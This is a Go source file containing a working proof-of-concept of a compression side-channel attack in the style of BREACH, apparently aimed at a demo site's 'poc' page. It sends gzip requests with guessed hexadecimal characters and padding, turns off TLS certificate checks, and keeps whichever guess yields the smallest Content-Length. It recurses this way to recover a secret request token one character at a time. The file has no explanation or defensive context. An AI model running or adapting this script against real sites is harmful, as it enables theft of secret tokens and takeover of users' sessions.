package main

import "log"
import "net/http"
import "crypto/tls"
import "strconv"

type answer struct {
     test string
     l int64
}

func get_size(Url string, token string, next string, padding string, c chan answer) {
     final := Url + token + next + padding
     tr := &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
     }
     client := &http.Client{Transport: tr}
     req, err := http.NewRequest("GET", final, nil)
     if err != nil {
        log.Fatalln(err)
     }
     req.Header.Add("Accept-Encoding", "gzip, deflate")
     resp, err := client.Do(req)
     if err != nil {
        log.Fatalln(err)
     }
     l, err := strconv.ParseInt(resp.Header.Get("Content-Length"), 0, 64)
     if err != nil {
        log.Fatalln(err)
       }
     c <- answer{next, l}
}

func try_many(Url string, Options [16]string, Token string,Padding string) {
     ch := make(chan answer, 16)
     for _, element := range Options {
          go get_size(Url, Token, element, Padding, ch)
     }
     min := answer{"", 888888}
     for range Options {
          a := <-ch
          if a.l < min.l {
               min = a
          }
     }
     log.Println(Token + min.test)
     try_many(Url, Options, Token + min.test, Padding)
}

func main() {
     Url := "https://malbot.net/poc/?request_token='"
     log.Println(Url)
     Options := [16]string{"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f"}
     Padding := "{}{}{}{}{}{}{}"
     try_many(Url, Options, "", Padding)
}
